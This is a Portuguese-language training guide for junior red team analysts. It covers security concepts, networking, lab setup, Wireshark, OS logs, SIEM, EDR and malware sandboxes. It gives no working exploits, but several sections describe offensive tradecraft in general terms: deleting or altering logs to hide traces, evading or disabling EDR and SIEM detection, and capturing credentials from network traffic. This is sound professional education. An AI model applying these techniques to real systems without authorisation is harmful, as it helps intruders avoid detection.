---
title: "Red Team: Analista de Cibersegurança Júnior"
date: 2025-06-26 16:30:00 -0300
categories: [Red Team, Nivel 1]
tags: [Teorica]
description: "Profissional em fase inicial que apoia as atividades de simulação de ataques, realiza tarefas básicas de reconhecimento e testes preliminares de vulnerabilidades sob supervisão. Está focado em aprender técnicas de ofensiva, ferramentas e metodologias para entender o funcionamento dos sistemas alvo."
image:
  path: /assets/img/000/capa.webp
  alt: Ilustração de um computador moderno com elementos de código e processamento
---

# 🔴 O que é Red Team?

O **Red Team** é um grupo de profissionais de segurança especializados em simular ataques reais contra sistemas, redes e pessoas, com o objetivo de identificar vulnerabilidades antes que atacantes reais o façam. É uma abordagem ofensiva dentro da segurança da informação.


## 🎯 Objetivo

Avaliar a **efetividade das defesas** da organização de forma realista, indo além dos testes tradicionais (como o pentest), simulando ameaças avançadas e persistentes (APT – Advanced Persistent Threat).


## 🔧 Atividades Comuns

- Simulação de invasões físicas e digitais  
- Testes de engenharia social (ex: phishing, vishing)  
- Exploração de falhas em aplicações e infraestrutura  
- Uso de técnicas avançadas para evitar detecção (evasão)  
- Desenvolvimento de malwares personalizados para testes  
- Avaliação da capacidade de resposta da equipe de defesa (Blue Team)


## 📌 Diferença entre Red Team e Pentest

| Característica        | Red Team                         | Pentest                        |
|-----------------------|----------------------------------|--------------------------------|
| Escopo                | Amplo e realista                 | Limitado e técnico             |
| Foco                  | Simular ataque real              | Encontrar vulnerabilidades     |
| Duração               | Semanas ou meses                 | Dias ou semanas                |
| Sigilo                | Alta discrição                   | Transparente com TI            |
| Detecção              | Deve **evitar ser detectado**    | Pode ser detectado             |


## 🧠 Perfis do Time

- Ethical Hacker / Offensive Security Expert  
- Exploit Developer  
- Especialista em Engenharia Social  
- Red Team Operator  
- Profissional com certificações como:  
  - OSCP / OSCE / OSEP  
  - CRTO (Certified Red Team Operator)  
  - eCPTX / eCPTXv2  


## 🛠️ Ferramentas Usadas

- **Cobalt Strike**, **Sliver**, **Mythic** (C2 frameworks)  
- **Metasploit**, **Impacket**, **BloodHound**, **Mimikatz**  
- Ferramentas próprias ou personalizadas  
- Scripts de evasão e ofuscação  
- Plataformas de phishing (GoPhish, King Phisher)


## 🔄 Relação com Outros Times

- **Blue Team (🔵):** O Red Team desafia o Blue Team, forçando-o a melhorar suas defesas.  
- **Purple Team (🟣):** Uma colaboração entre Red e Blue para melhorar continuamente os dois lados.  
- **White Team (⚪):** Define regras, monitora, garante a ética e neutralidade dos exercícios.


## 📚 Frameworks de Referência

- MITRE ATT&CK  
- Red Team Tactics (RTT)  
- NIST SP 800-115  
- TIBER-EU (Threat Intelligence-Based Ethical Red Teaming)


## ✅ Benefícios para a Organização

- Revela falhas reais de segurança, inclusive humanas  
- Melhora a prontidão da equipe de resposta a incidentes  
- Testa defesas em cenários realistas  
- Reduz o impacto de ataques reais

# 🔴 Red Team N1: Conceitos Básicos de Segurança da Informação – Confidencialidade, Integridade e Disponibilidade (CIA)

Antes de planejar e executar ataques simulados, é fundamental entender os princípios básicos que regem a segurança da informação. O modelo CIA (Confidencialidade, Integridade e Disponibilidade) guia tanto defensores quanto ofensores na proteção e exploração de sistemas.

Conheça o terreno para atacar com eficácia.

---

## 🧠 O que é o modelo CIA?

O modelo CIA define três objetivos principais que toda segurança deve buscar:

- **Confidencialidade:** garantir que a informação seja acessível apenas a quem tem permissão  
- **Integridade:** assegurar que os dados não sejam alterados indevidamente  
- **Disponibilidade:** manter o acesso à informação e sistemas sempre que necessário  

---

## 🧱 Impacto do modelo CIA no Red Team

### 1. Confidencialidade

- Identificar formas de acessar dados restritos (exfiltração)  
- Explorar falhas em controles de acesso e autenticação  
- Bypass de criptografia e engenharia social para obter credenciais  

### 2. Integridade

- Investigar formas de alterar dados para desestabilizar sistemas ou encobrir rastros  
- Modificação de logs, arquivos e configurações para esconder presença  
- Ataques de injeção e manipulação de processos  

### 3. Disponibilidade

- Avaliar vulnerabilidades que causem interrupção (DoS/DDoS)  
- Impactar sistemas críticos para gerar impacto operacional  
- Planejar ataques que causem degradação do serviço sem detecção imediata  

---

## 🔍 Exemplos práticos

```
- Confidencialidade: phishing para capturar credenciais administrativas  
- Integridade: alteração de registros para evitar detecção em uma invasão  
- Disponibilidade: ataque de negação de serviço contra um servidor web  
```

---

## ⚙️ Como usar o modelo CIA para planejar ataques

- Analise quais pilares são mais frágeis no alvo para escolher a estratégia  
- Explore a cadeia de ataques que comprometam um ou mais pilares  
- Utilize técnicas avançadas para maximizar o impacto e minimizar a detecção  
- Prepare-se para adaptar o ataque conforme as defesas identificadas  

---

## ✅ Conclusão

Entender Confidencialidade, Integridade e Disponibilidade é fundamental para que um Red Team N1 planeje ataques eficazes e realistas. Dominar esses conceitos ajuda a identificar pontos fracos e maximizar o sucesso das simulações ofensivas.

---

# 🔴 Red Team N1: Fundamentos de Redes – TCP/IP, DNS e HTTP

Para atuar com eficácia em Red Team, é essencial dominar os fundamentos das redes, pois grande parte das técnicas ofensivas depende do entendimento dos protocolos de comunicação. Conhecer TCP/IP, DNS e HTTP ajuda a mapear alvos, explorar vulnerabilidades e evadir defesas.

Domine a rede para atacar com precisão.

---

## 🧠 Principais protocolos para o Red Team

- **TCP/IP:** base da comunicação na internet, permite troca de pacotes entre dispositivos  
- **DNS:** serviço de resolução de nomes que traduz domínios em endereços IP  
- **HTTP:** protocolo usado para comunicação web, alvo frequente de ataques  

---

## 🧱 Conceitos essenciais

### 1. TCP/IP

- Modelo em camadas: Aplicação, Transporte, Internet, Link  
- TCP: conexão confiável, controle de fluxo e retransmissão  
- IP: roteamento e endereçamento dos pacotes  
- Ferramentas: nmap para escaneamento e análise de portas  

### 2. DNS

- Como funciona a resolução de nomes em IPs  
- Tipos de registros DNS: A, MX, CNAME, TXT  
- Técnicas de ataque: DNS spoofing, DNS tunneling  

### 3. HTTP

- Funcionamento básico do protocolo (requests e responses)  
- Métodos comuns: GET, POST, PUT, DELETE  
- Exploração: ataques de injeção, XSS, manipulação de headers  

---

## 🔍 Exemplos práticos

```
- TCP/IP: usar nmap para mapear portas abertas no alvo  
- DNS: coletar informações públicas via DNS enumeration  
- HTTP: testar formulários web para vulnerabilidades de injeção  
```

---

## ⚙️ Como aplicar no Red Team

- Utilize o conhecimento para planejar fases de reconhecimento e exploração  
- Explore fraquezas na configuração dos protocolos para obter acesso  
- Use técnicas de evasão baseadas no comportamento dos protocolos  
- Combine informações obtidas para construir ataques mais eficazes  

---

## ✅ Conclusão

Dominar os fundamentos de TCP/IP, DNS e HTTP é crucial para qualquer Red Team N1 que deseja realizar ataques realistas e eficientes. Esses protocolos são a base das comunicações e seu conhecimento abre portas para inúmeras técnicas ofensivas.

---

# 🔴 Red Team N1: Instalando VMs para Laboratório – Kali Linux (Red Team) e Security Onion/Windows Server (Blue Team)

Montar um laboratório prático é fundamental para o desenvolvimento das habilidades de Red Team. Ter um ambiente controlado com máquinas para ataque (Kali Linux) e defesa (Security Onion ou Windows Server) permite simular cenários reais e testar técnicas sem riscos.

Prepare seu ambiente para praticar com segurança.

---

## 🧠 Por que montar um laboratório com VMs?

- Praticar ataques e defesas em ambiente seguro  
- Testar ferramentas, técnicas e estratégias com liberdade  
- Entender o comportamento dos sistemas e respostas a ataques  
- Desenvolver habilidades de análise e mitigação  

---

## 🧱 Passos para instalação das VMs

### 1. Escolher a plataforma de virtualização

- Recomendo: **VirtualBox** (gratuito) ou **VMware Workstation Player**  
- Instale no seu computador conforme o sistema operacional  

### 2. Baixar as imagens ISO

- **Kali Linux:** [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)  
- **Security Onion:** [https://securityonion.net/](https://securityonion.net/)  
- **Windows Server:** obtenha via portal da Microsoft ou licenças de avaliação  

### 3. Criar a VM Kali Linux

- Configurar memória (mínimo 2GB, recomendado 4GB+)  
- Definir disco virtual (mínimo 20GB)  
- Configurar rede em modo bridge ou NAT para comunicação com outras VMs  
- Instalar Kali a partir do ISO baixado  

### 4. Criar a VM Security Onion ou Windows Server

- Configurar recursos semelhantes (memória, disco)  
- Instalar a partir do ISO ou imagem correspondente  
- Configurar rede para comunicar com Kali e com seu host  

---

## 🔍 Dicas para configuração e uso

```
- Reserve uma rede virtual interna para isolar o laboratório da rede principal  
- Atualize os sistemas e instale ferramentas adicionais conforme necessidade  
- Configure snapshots para salvar estados antes de testes importantes  
- Pratique comandos básicos, ataques simulados e análise de logs entre as VMs  
```

---

## ✅ Conclusão

Ter um laboratório com Kali Linux para Red Team e Security Onion ou Windows Server para Blue Team é essencial para a prática segura e eficaz. Esse ambiente facilita o aprendizado, experimentação e desenvolvimento de habilidades práticas.

---

# 🔴 Red Team N1: Material de Estudo – Curso Introdutório de Segurança e Recursos no YouTube

Para iniciar sua jornada no Red Team, é fundamental construir uma base sólida com conteúdos introdutórios que abordem os conceitos essenciais de segurança da informação. Cursos online e vídeos no YouTube são ótimas formas de absorver o conhecimento de forma acessível e prática.

Comece com o básico para construir seu futuro.

---

## 🧠 Por que começar com cursos introdutórios?

- Explicam conceitos fundamentais e terminologias  
- Apresentam cenários reais e exemplos práticos  
- Fornecem estrutura para aprofundar estudos futuros  
- Facilitam o entendimento de segurança ofensiva e defensiva  

---

## 🧱 Sugestões de materiais iniciais

### 1. Cursos introdutórios

- **“Cybersecurity Basics”** – curso gratuito disponível em plataformas como Coursera, Udemy ou Cybrary  
- **“Introduction to Cyber Security”** da Cisco Networking Academy  
- **“Fundamentals of Cybersecurity”** no edX  

### 2. Canais do YouTube

- **NetworkChuck** – explica desde o básico até tópicos avançados de segurança e redes  
- **The Cyber Mentor** – conteúdo prático voltado para Red Team e pentesting  
- **HackerSploit** – tutoriais sobre hacking ético, segurança e ferramentas  

---

## 🔍 Dicas para aproveitar o material

```
- Faça anotações e revise os conteúdos periodicamente  
- Pratique o que aprendeu em laboratórios virtuais e VMs  
- Combine vídeos com leitura complementar para fixar o conhecimento  
- Participe de comunidades para tirar dúvidas e trocar experiências  
```

---

## ✅ Conclusão

Utilizar cursos introdutórios e vídeos do YouTube é uma excelente maneira de iniciar sua trajetória no Red Team. O aprendizado constante e a prática farão a diferença para sua evolução profissional.

---

# 🔴 Red Team N1: Estudo Detalhado dos Modelos OSI e TCP/IP

Dominar os modelos OSI e TCP/IP é fundamental para qualquer profissional de Red Team. Compreender as camadas que estruturam as redes ajuda a identificar pontos de ataque, analisar tráfego e explorar vulnerabilidades com maior precisão.

Conhecimento profundo da rede é chave para um ataque eficaz.

---

## 🧠 O que são os modelos OSI e TCP/IP?

- **Modelo OSI:** referência teórica que divide a comunicação em 7 camadas distintas  
- **Modelo TCP/IP:** modelo prático usado na internet, com 4 camadas principais  
- Ambos ajudam a entender como os dados transitam e onde atacar ou defender  

---

## 🧱 Detalhes das camadas

### Modelo OSI (7 camadas)

1. **Física:** transmissão de bits brutos (cabos, sinais elétricos)  
2. **Enlace:** controle de acesso ao meio e detecção de erros (MAC, switches)  
3. **Rede:** roteamento e endereçamento (IP)  
4. **Transporte:** controle de fluxo e entrega confiável (TCP, UDP)  
5. **Sessão:** controle de conexões e sessões  
6. **Apresentação:** formatação, criptografia e compressão  
7. **Aplicação:** protocolos finais como HTTP, FTP, DNS  

### Modelo TCP/IP (4 camadas)

1. **Link:** equivalente a física + enlace  
2. **Internet:** roteamento (IP)  
3. **Transporte:** TCP/UDP  
4. **Aplicação:** protocolos e serviços (HTTP, DNS, SMTP)  

---

## 🔍 Como aplicar no Red Team

```
- Identificar em qual camada o alvo pode ser explorado (ex: injeção na aplicação, spoofing na rede)  
- Analisar tráfego capturado para detectar anomalias  
- Explorar falhas específicas em protocolos de cada camada  
- Planejar ataques combinando múltiplas camadas para maior eficácia  
```

---

## ⚙️ Ferramentas úteis para estudo

- Wireshark para análise de pacotes  
- tcpdump para captura em linha de comando  
- Ferramentas de mapeamento de rede como nmap  
- Simuladores de redes e laboratórios virtuais  

---

## ✅ Conclusão

Estudar os modelos OSI e TCP/IP detalhadamente é um passo essencial para se tornar um Red Team eficaz. Com esse conhecimento, você entenderá melhor o funcionamento das redes e poderá identificar e explorar vulnerabilidades com mais precisão.

---

# 🔴 Red Team N1: Entendendo Protocolos TCP, UDP e ICMP

Para um Red Team eficaz, conhecer como funcionam os principais protocolos de rede é essencial. TCP, UDP e ICMP são protocolos fundamentais usados para comunicação entre dispositivos e, também, vetores comuns em técnicas de ataque e reconhecimento.

Domine esses protocolos para mapear e explorar alvos com eficiência.

---

## 🧠 O que são TCP, UDP e ICMP?

- **TCP (Transmission Control Protocol):** protocolo orientado à conexão, confiável e que garante entrega dos dados  
- **UDP (User Datagram Protocol):** protocolo sem conexão, rápido e sem garantia de entrega, usado para transmissões rápidas  
- **ICMP (Internet Control Message Protocol):** protocolo para troca de mensagens de controle e diagnóstico na rede  

---

## 🧱 Características principais

### TCP

- Estabelece conexão via handshake de 3 vias (SYN, SYN-ACK, ACK)  
- Controle de fluxo e retransmissão de pacotes perdidos  
- Usado por protocolos como HTTP, FTP, SMTP  
- Ataques comuns: TCP SYN Flood (DoS), hijacking de sessão  

### UDP

- Comunicação sem conexão e sem confirmação de entrega  
- Usado para DNS, VoIP, streaming  
- Menor overhead, mas maior chance de perda de pacotes  
- Ataques comuns: UDP Flood, reflexão/amplificação  

### ICMP

- Utilizado para mensagens de erro e teste (ping, traceroute)  
- Fundamental para diagnóstico e manutenção da rede  
- Ataques comuns: ICMP Flood (ping flood), ICMP redirect  

---

## 🔍 Exemplos práticos

```
- TCP: usar nmap para detectar portas TCP abertas no alvo  
- UDP: realizar scan UDP para identificar serviços em execução  
- ICMP: ping para verificar se o host está ativo e responder a testes  
```

---

## ⚙️ Aplicação no Red Team

- Use TCP para exploração de serviços com conexão garantida  
- Explore UDP para identificar serviços rápidos e menos protegidos  
- Utilize ICMP para mapeamento inicial e evasão de firewall  
- Combine varreduras com análise dos protocolos para planejar ataques precisos  

---

## ✅ Conclusão

Compreender os protocolos TCP, UDP e ICMP é fundamental para um Red Team N1 planejar e executar ataques efetivos. O domínio desses protocolos ajuda a identificar superfícies de ataque e a evitar detecção durante operações ofensivas.

---

# 🔴 Red Team N1: Ferramenta Wireshark – Captura e Análise Simples de Pacotes

Para um Red Team eficiente, entender o tráfego de rede é essencial. O Wireshark é uma das ferramentas mais poderosas e populares para capturar e analisar pacotes de rede, permitindo identificar comunicações, protocolos e potenciais vulnerabilidades.

Use o Wireshark para enxergar o que passa pela rede.

---

## 🧠 O que é o Wireshark?

- Ferramenta de código aberto para captura e análise de tráfego de rede  
- Suporta centenas de protocolos e formatos diferentes  
- Permite filtragem e inspeção detalhada de pacotes capturados  
- Fundamental para investigação, diagnóstico e pentests  

---

## 🧱 Funcionalidades básicas

- Captura ao vivo do tráfego da interface de rede  
- Filtros para exibir somente pacotes de interesse (ex: `tcp`, `http`)  
- Decodificação dos protocolos para leitura humana  
- Estatísticas e gráficos para análise do comportamento da rede  

---

## 🔍 Passos simples para começar

```
1. Inicie o Wireshark e selecione a interface de rede para captura  
2. Use filtros básicos para focar no tráfego desejado (ex: `ip.addr == 192.168.1.10`)  
3. Analise os pacotes capturados, observando origem, destino e protocolo  
4. Utilize a função “Follow TCP Stream” para ver a conversa completa  
```

---

## ⚙️ Aplicação no Red Team

- Identificar serviços ativos e protocolos usados no alvo  
- Capturar dados que possam conter credenciais ou informações sensíveis  
- Analisar respostas a ataques de rede para ajustar estratégias  
- Detectar anomalias ou comportamento suspeito no tráfego  

---

## ✅ Conclusão

Dominar o Wireshark permite ao Red Team N1 obter uma visão clara do tráfego de rede, fundamental para reconhecimento, exploração e pós-exploração. Comece simples, evolua para análises mais complexas e use essa ferramenta para maximizar seu impacto ofensivo.

---

# 🔴 Red Team N1: Prática – Capturar Tráfego da Rede e Analisar Conexões Básicas

A melhor forma de aprender sobre redes e segurança ofensiva é colocando a mão na massa. Capturar e analisar o tráfego da sua rede local ajuda a entender o funcionamento dos protocolos e identificar padrões de comunicação.

Vamos praticar!

---

## 🧠 Objetivo da prática

- Capturar pacotes de rede em tempo real  
- Identificar conexões básicas entre dispositivos  
- Reconhecer protocolos e padrões comuns  
- Preparar o terreno para análises mais complexas  

---

## 🧱 Passos para a captura e análise

### 1. Preparar o ambiente

- Use Wireshark instalado na sua máquina ou em uma VM  
- Certifique-se de ter permissões para capturar tráfego na interface de rede  

### 2. Capturar o tráfego

- Abra o Wireshark e selecione a interface correta (ex: Wi-Fi, Ethernet)  
- Inicie a captura de pacotes ao vivo  

### 3. Filtrar conexões básicas

- Use filtros simples para focar em conexões comuns:  
  - `tcp` para tráfego TCP  
  - `udp` para tráfego UDP  
  - `icmp` para mensagens de controle  
- Observe endereços IP, portas e protocolos  

### 4. Analisar conexões

- Clique em pacotes individuais para ver detalhes  
- Use “Follow TCP Stream” para entender conversas completas  
- Identifique serviços acessados (ex: HTTP, DNS)  

---

## 🔍 Dicas para a análise

```
- Observe padrões repetitivos que indiquem serviços ativos  
- Identifique fluxos de dados entre seu dispositivo e servidores externos  
- Procure por tráfego não usual ou desconhecido  
- Registre insights para melhorar seus ataques ou defesas futuras  
```

---

## ✅ Conclusão

Praticar a captura e análise de tráfego básico é essencial para qualquer Red Team N1. Essa habilidade permite entender o comportamento da rede e planejar ataques mais eficazes com base em evidências reais.

---

# 🔴 Red Team N1: Conceitos Básicos de Sistemas Windows e Linux – Arquivos, Permissões e Processos

Para atuar com eficiência em Red Team, é fundamental entender como funcionam os sistemas operacionais Windows e Linux, especialmente no que diz respeito ao gerenciamento de arquivos, permissões e processos. Esse conhecimento permite explorar vulnerabilidades e controlar sistemas de forma eficaz.

Conheça a base para suas operações ofensivas.

---

## 🧠 Fundamentos dos sistemas operacionais

- Windows e Linux são os sistemas mais comuns em ambientes corporativos  
- Cada um tem estrutura própria para arquivos, permissões e gerenciamento de processos  
- Saber navegar e manipular esses elementos é essencial para exploração e pós-exploração  

---

## 🧱 Arquivos

### Windows

- Arquivos organizados em pastas e unidades (C:\, D:\)  
- Extensões indicam o tipo (ex: .exe, .dll, .txt)  
- Atributos como oculto, sistema e somente leitura  

### Linux

- Arquivos e diretórios organizados em uma árvore única iniciando no `/`  
- Sem extensões obrigatórias, mas convencionais (ex: .sh, .conf)  
- Tipos variados: arquivos regulares, diretórios, links simbólicos, dispositivos  

---

## 🧱 Permissões

### Windows

- Controle via ACL (Access Control Lists)  
- Permissões principais: leitura, escrita, execução  
- Herança e propagação de permissões em pastas  

### Linux

- Permissões básicas para dono, grupo e outros (rwx)  
- Representadas por bits e símbolos (ex: `rwxr-xr--`)  
- Comandos para gerenciar: `chmod`, `chown`, `chgrp`  

---

## 🧱 Processos

### Windows

- Gerenciador de tarefas mostra processos e serviços  
- Processos podem ser iniciados por usuário ou sistema  
- Ferramentas para análise: Task Manager, Process Explorer  

### Linux

- Processos gerenciados via PID (Process ID)  
- Comandos comuns: `ps`, `top`, `kill`  
- Hierarquia de processos e uso de sinais para controle  

---

## 🔍 Exemplos práticos

```
- Windows: verificar permissões de um arquivo via propriedades  
- Linux: usar `ls -l` para listar permissões de arquivos  
- Analisar processos ativos com Task Manager (Windows) e `top` (Linux)  
```

---

## ⚙️ Aplicação no Red Team

- Explorar permissões incorretas para escalonamento de privilégios  
- Identificar processos críticos para manipulação ou injeção de código  
- Navegar e manipular arquivos para persistência e exfiltração  
- Usar comandos nativos para evitar detecção em ambientes monitorados  

---

## ✅ Conclusão

Dominar os conceitos básicos de arquivos, permissões e processos em Windows e Linux é indispensável para o Red Team N1. Com essa base, você pode planejar ataques mais eficientes e furtivos, aproveitando as particularidades de cada sistema.

---

# 🔴 Red Team N1: Onde Encontrar Logs no Windows e Linux – Event Viewer e /var/log

Analisar logs é uma das principais atividades no Red Team para entender o que aconteceu em um sistema, identificar atividades suspeitas e planejar movimentos furtivos. Conhecer os locais e ferramentas para acessar logs é essencial para qualquer profissional.

Saiba onde os sistemas guardam seus rastros.

---

## 🧠 Importância dos logs

- Documentam eventos, erros, acessos e atividades do sistema  
- São fontes valiosas para identificar comportamentos anormais  
- Ferramentas de defesa usam logs para detectar e alertar sobre ameaças  

---

## 🧱 Logs no Windows

- **Event Viewer** (Visualizador de Eventos) é a ferramenta padrão para acessar logs  
- Principais categorias:  
  - **Application:** eventos de aplicativos instalados  
  - **Security:** logs de segurança (login, falhas, auditoria)  
  - **System:** eventos do sistema operacional e drivers  
- Logs ficam armazenados em arquivos `.evtx` no sistema  

---

## 🧱 Logs no Linux

- Diretório padrão: `/var/log/`  
- Principais arquivos e diretórios:  
  - `syslog` ou `messages`: logs gerais do sistema  
  - `auth.log` ou `secure`: logs de autenticação e sudo  
  - `kern.log`: mensagens do kernel  
  - `dmesg`: buffer do kernel, informações de hardware  
  - Logs específicos de serviços (ex: `/var/log/apache2/`)  

---

## 🔍 Exemplos práticos

```
- Windows: abrir Event Viewer (`eventvwr.msc`) e navegar em Security > Logon para eventos de login  
- Linux: usar comandos `cat /var/log/auth.log` ou `tail -f /var/log/syslog` para acompanhar logs em tempo real  
- Filtrar logs para eventos de interesse usando filtros no Event Viewer ou `grep` no Linux  
```

---

## ⚙️ Aplicação no Red Team

- Revisar logs para identificar pontos de detecção e evitar alertas  
- Apagar ou modificar logs para ocultar rastros após invasão (com cuidado e ética)  
- Monitorar logs para identificar falhas e oportunidades de escalonamento  
- Entender o padrão normal para detectar anomalias em testes ofensivos  

---

## ✅ Conclusão

Saber onde encontrar e como analisar logs no Windows e Linux é uma habilidade crítica para o Red Team N1. O domínio dessas fontes ajuda a mapear sistemas, planejar ataques e entender respostas dos alvos.

---

# 🔴 Red Team N1: Como Interpretar Logs Comuns – Login e Eventos de Segurança

Interpretar logs é uma habilidade essencial para entender o comportamento de sistemas e identificar atividades suspeitas durante testes de Red Team. Logs de login e eventos de segurança são fontes ricas para detectar tentativas de acesso, falhas e possíveis invasões.

Aprenda a ler os sinais que os sistemas deixam.

---

## 🧠 Por que interpretar logs?

- Revela tentativas de acesso legítimas e maliciosas  
- Ajuda a detectar padrões anormais e ataques em andamento  
- Fornece evidências para análise forense e planejamento de ataques futuros  

---

## 🧱 Logs comuns para analisar

### 1. Logs de Login

- Indicam quando e por quem um usuário acessou o sistema  
- Informações típicas: usuário, horário, endereço IP, sucesso ou falha  
- Atenção a falhas repetidas, logins fora do horário ou de locais incomuns  

### 2. Eventos de Segurança

- Incluem alterações em permissões, execução de comandos críticos, criação de contas  
- Alertam para atividades suspeitas, como tentativas de escalonamento ou acesso privilegiado  
- Monitorar eventos de auditoria e acesso a arquivos sensíveis  

---

## 🔍 Exemplos práticos de interpretação

```
- Login falho repetido pode indicar ataque de força bruta  
- Login bem-sucedido de usuário desconhecido ou fora do horário normal  
- Modificações em contas administrativas sem autorização  
- Execução de comandos incomuns em horários atípicos  
```

---

## ⚙️ Dicas para análise eficiente

- Use ferramentas para filtrar e correlacionar eventos  
- Entenda o padrão normal de operação para identificar anomalias  
- Combine análise de diferentes logs para contexto completo  
- Documente descobertas para informar a equipe e ajustar ataques  

---

## ✅ Conclusão

Interpretar logs de login e eventos de segurança é uma competência chave para o Red Team N1. Saber identificar sinais de acesso e atividades suspeitas permite ajustar estratégias ofensivas e evitar detecção.

---

# 🔴 Red Team N1: Prática – Analisar Logs Locais e Buscar Atividades Suspeitas

Colocar a teoria em prática é fundamental para aprimorar suas habilidades no Red Team. Analisar logs locais ajuda a identificar padrões anormais e atividades maliciosas que podem indicar invasões ou tentativas de ataque.

Vamos treinar a caça aos sinais!

---

## 🧠 Objetivo da prática

- Examinar logs de sistemas Windows e Linux  
- Identificar eventos fora do padrão e suspeitos  
- Entender como reconhecer ataques e comportamentos maliciosos  
- Desenvolver rotina de análise para uso em testes e investigações  

---

## 🧱 Passos para análise

### 1. Preparar o ambiente

- Acesse a máquina alvo (física ou VM) com permissões adequadas  
- Para Windows, use o Event Viewer; para Linux, acesse arquivos em `/var/log/`  

### 2. Coletar logs relevantes

- Windows: focar em logs de segurança, sistema e aplicação  
- Linux: analisar `auth.log`, `syslog`, `kern.log` e logs específicos de serviços  

### 3. Buscar atividades suspeitas

- Falhas repetidas de login  
- Acessos em horários incomuns  
- Criação ou alteração de usuários e permissões  
- Execução de comandos ou serviços não autorizados  

### 4. Documentar e correlacionar

- Anote eventos importantes e timestamps  
- Correlacione com outras fontes e comportamentos observados  
- Gere relatórios simples para consolidar a análise  

---

## 🔍 Exemplos de comandos e ações

```
- Windows: usar filtros no Event Viewer para “Logon Failure” e eventos críticos  
- Linux: comandos como `grep "failed" /var/log/auth.log` e `tail -f /var/log/syslog`  
- Procurar por eventos que indiquem escalonamento de privilégios ou movimentação lateral  
```

---

## ✅ Conclusão

Praticar a análise de logs locais e identificar atividades suspeitas fortalece a capacidade do Red Team N1 de detectar e explorar falhas. Essa rotina é essencial para testes mais precisos e para aprimorar sua visão ofensiva.

---

# 🔴 Red Team N1: Introdução a SIEM – Conceitos e Uso Básico (Splunk, Elastic Stack)

SIEM (Security Information and Event Management) é uma tecnologia fundamental para a segurança corporativa, agregando, correlacionando e analisando logs e eventos de múltiplas fontes. Para o Red Team, entender o funcionamento do SIEM ajuda a planejar ataques que evadem ou manipulam esses sistemas.

Conheça a ferramenta que os defensores usam para detectar você.

---

## 🧠 O que é SIEM?

- Plataforma que coleta e centraliza logs de sistemas, redes e aplicações  
- Correlaciona eventos para identificar ameaças e anomalias  
- Gera alertas e dashboards para monitoramento em tempo real  
- Exemplos populares: **Splunk**, **Elastic Stack (ELK)**, IBM QRadar  

---

## 🧱 Componentes principais

- **Coleta de dados:** agentes ou métodos que enviam logs para o SIEM  
- **Armazenamento:** banco de dados otimizado para grandes volumes de dados  
- **Análise:** correlação, busca e visualização de eventos  
- **Resposta:** alertas automáticos e integração com sistemas de resposta  

---

## 🔍 Uso básico para Red Team

```
- Entender quais tipos de logs e eventos o SIEM monitora no ambiente alvo  
- Conhecer regras e padrões de detecção para evitar alertas durante ataques  
- Testar técnicas de evasão baseadas em manipulação de logs e eventos  
- Monitorar dashboards públicos para aprender sobre alertas comuns  
```

---

## ⚙️ Exemplos práticos de SIEMs populares

- **Splunk:** interface web intuitiva, poderosa busca e análise em tempo real  
- **Elastic Stack:** conjunto open source (Elasticsearch, Logstash, Kibana) para coleta e visualização  
- Integração com várias fontes e APIs para automação de respostas  

---

## ✅ Conclusão

Para o Red Team N1, conhecer o conceito e uso básico de SIEMs como Splunk e Elastic Stack é vital para planejar ataques furtivos e eficazes. Dominar essas ferramentas auxilia na compreensão das defesas e na criação de estratégias mais avançadas.

---

# 🔴 Red Team N1: Uso de EDR – Endpoint Detection and Response

EDR (Endpoint Detection and Response) é uma tecnologia avançada que monitora e coleta dados dos endpoints (dispositivos finais) para detectar, investigar e responder a ameaças em tempo real. Para o Red Team, entender como o EDR funciona é essencial para planejar ataques que evadem ou contornam essas defesas.

Conheça o guardião dos endpoints para melhorar sua estratégia ofensiva.

---

## 🧠 O que é EDR?

- Solução focada em detectar atividades suspeitas nos endpoints  
- Coleta dados detalhados de processos, arquivos, rede e comportamento  
- Fornece alertas, análises forenses e respostas automáticas ou manuais  
- Exemplos populares: CrowdStrike Falcon, Carbon Black, Microsoft Defender for Endpoint  

---

## 🧱 Principais funcionalidades

- Monitoramento contínuo de endpoints  
- Detecção de ameaças baseada em comportamento e assinaturas  
- Análise automatizada e manual de incidentes  
- Resposta rápida: isolamento, bloqueio de processos e remoção de ameaças  

---

## 🔍 Como o Red Team pode usar esse conhecimento

```
- Entender as técnicas comuns que EDRs detectam para evitar alertas  
- Testar ferramentas e métodos para desativar ou burlar EDRs (com ética e autorização)  
- Analisar os logs e alertas gerados para ajustar ataques futuros  
- Simular ataques reais considerando a presença do EDR para treino da equipe Blue Team  
```

---

## ⚙️ Exemplos práticos

- Reconhecer comportamentos que disparam alertas (ex: execução de payloads, elevação de privilégios)  
- Utilizar técnicas de “living off the land” para minimizar rastros  
- Avaliar os mecanismos de resposta automática para evitar isolamento do endpoint  

---

## ✅ Conclusão

Compreender o uso e funcionamento do EDR é crucial para o Red Team N1 que deseja planejar ataques furtivos e eficazes. Esse conhecimento permite antecipar defesas e explorar brechas para maximizar o sucesso ofensivo.

---

# 🔴 Red Team N1: Ferramentas de Sandbox para Análise de Malware – AnyRun e Hybrid Analysis

Para o Red Team, entender como funcionam as sandboxes é fundamental para analisar amostras de malware e antecipar as estratégias do adversário. Ferramentas como AnyRun e Hybrid Analysis permitem executar arquivos suspeitos em ambientes controlados, revelando comportamentos maliciosos.

Use essas ferramentas para ampliar sua visão ofensiva.

---

## 🧠 O que são sandboxes?

- Ambientes isolados que executam códigos suspeitos com segurança  
- Monitoram ações do malware: arquivos criados, conexões de rede, processos, modificações no sistema  
- Geram relatórios detalhados para análise técnica e inteligência  

---

## 🧱 Ferramentas populares

### 1. AnyRun

- Sandbox interativa online  
- Permite execução e monitoramento em tempo real  
- Interface amigável para análises manuais e colaborativas  
- Útil para análises rápidas e demonstrações  

🔗 [https://any.run/](https://any.run/)

### 2. Hybrid Analysis

- Sandbox mantida pela CrowdStrike  
- Análise automática com múltiplas engines e heurísticas  
- Relatórios detalhados com indicadores técnicos e comportamento  
- Suporta vários tipos de arquivos, incluindo scripts e documentos  

🔗 [https://www.hybrid-analysis.com/](https://www.hybrid-analysis.com/)

---

## 🔍 Como o Red Team pode usar?

```
- Entender técnicas usadas por malwares para evitar detecção  
- Analisar amostras próprias para testar defesas e estratégias  
- Criar payloads personalizados inspirados em comportamentos observados  
- Preparar relatórios para compartilhar conhecimento com a equipe  
```

---

## ✅ Conclusão

Dominar o uso de sandboxes como AnyRun e Hybrid Analysis permite ao Red Team N1 ampliar sua capacidade de análise e desenvolvimento de técnicas ofensivas. Essas ferramentas são aliados valiosos para quem quer entender o comportamento real dos malwares.

---

